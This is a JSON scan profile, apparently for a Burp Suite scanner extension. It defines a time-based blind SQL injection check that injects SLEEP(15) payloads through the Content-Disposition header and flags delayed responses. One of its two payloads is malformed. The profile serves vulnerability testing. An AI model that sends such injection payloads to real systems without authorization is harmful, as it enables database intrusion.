[
  {
    "ProfileName": "BlindSQLi-TimeBased (T-2)",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@harshinsecurity",
    "Payloads": [
      "true,form-data; language\u003den\u0027XOR(if(now()\u003dsysdate(),SLEEP(15),0))XOR\u0027Z",
      "true,form-data; language\u003den\u0027if(now()\u003dsysdate(),sleep(15,0)"
    ],
    "Encoder": [],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [],
    "Tags": [
      "SQLi",
      "All"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "13",
    "TimeOut2": "17",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "isHeaderValue": true,
    "sequence": false,
    "NewHeaders": [
      "Content-Disposition"
    ],
    "MatchType": 5,
    "Scope": 0,
    "RedirType": 0,
    "MaxRedir": 0,
    "requestType": 1,
    "rawRequest": "",
    "payloadPosition": 2,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "there may be sqli. check manually.",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      18,
      65,
      70,
      80,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      21,
      31,
      41,
      51,
      61,
      71,
      72,
      73,
      74,
      75,
      76,
      77,
      78,
      36,
      81,
      82
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false,
    "changeHttpRequest": false,
    "showIssue": false,
    "changeHttpRequestType": 1
  }
]